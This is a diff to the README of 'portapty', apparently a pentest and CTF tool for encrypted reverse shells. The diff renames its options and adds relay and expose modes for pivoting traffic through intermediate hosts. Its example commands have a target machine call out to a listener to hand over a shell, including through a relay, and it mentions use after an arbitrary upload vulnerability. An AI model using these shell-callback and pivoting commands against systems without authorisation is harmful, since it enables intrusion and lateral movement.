@@ -16,11 +16,13 @@ Multiplexer: multiple shells can connect at once
 
 ## Usage
 ```
-portapty <client|server|keygen> OPTIONS
+portapty {client|server|keygen|relay|expose} OPTIONS
 Options:
-    client: [cert CERTHASH] eps IP PORT [IP PORT]...
-    server: [cert CERTFILE] [key KEYFILE] [driver PATH] [cmd CMD] eps IP PORT [IP PORT]...;
+    client: [cert CERTHASH] to IP PORT [to IP PORT]...
+    server: [cert CERTFILE] [key KEYFILE] [driver PATH] [cmd CMD] bind IP PORT [bind IP PORT]...;
     keygen: [cert CERTFILE] [key KEYFILE]
+    relay:  bind IP PORT to IP PORT [bind|to IP PORT]...
+    expose: [cert CERTFILE] [key KEYFILE] bind IP PORT to IP PORT [{bind|to} IP PORT]...
 ```
 ### Server
 A simple invocation would be `portapty server eps :: 42069`. This hosts a server on port 42069 that will accept
@@ -49,9 +51,9 @@ We also can elect to use `bash` rather than the standard shell with the system, 
 ### Client
 It is rather irregular to invoke the client directly, but if you are particularly worried about security, or are working with an arbitrary upload vulnerability, this could be helpful. 
 
-For a simple connection WITHOUT verifying the server, you can use just `portapty client eps :: 42069`, but for securing it, you can use:
+For a simple connection WITHOUT verifying the server, you can use just `portapty client to :: 42069`, but for securing it, you can use:
 ```
-portapty client cert iITKuu8FgIgarNJCo/4mG6mbN0I/p6kytpfTVvB+PCo= eps :: 42069
+portapty client cert iITKuu8FgIgarNJCo/4mG6mbN0I/p6kytpfTVvB+PCo= to :: 42069
 ```
 This will check that the certificate SHA2-256 hash is `iITKuu8FgIgarNJCo/4mG6mbN0I/p6kytpfTVvB+PCo=`, and fail if it isn't.
 
@@ -69,7 +71,25 @@ The server can be to to use the certificate and key like so:
 ```
 portapty server key portapty.key cert portapty.crt
 ```
+### Relay and expose
+This is one of the cooler features of portapty. This acts as a simple TCP forwarder, and so allows pivoting with a central server:
 
+```bash
+# Main server
+portapty server key portapty.key cert portapty.crt bind 10.0.0.1 42069
+# Pivot server
+portapty relay bind 192.168.0.1 42069 to 10.0.0.10 42069
+# Target server
+portapty client cert FinGeRpRInt= to 192.168.0.1 42069
+```
+
+Since the client is encrypted end-to-end, this unencrypted relay usage is secure. However, `relay` could also be used as a port forwarder, and so would need encryption:
+```bash
+# Server you wish to receive connections on
+portapty expose key portapty.key cert portapty.crt bind 10.0.0.1 42069 to ::1 8080
+# Server you are proxying for
+portapty relay cert FinGeRpRInt= bind :: 8080 to 10.0.0.1 42069
+```
 
 ## Disclaimer
 Please don't do anything stupid with this (i.e. anything outside pentesting and ctfs). 
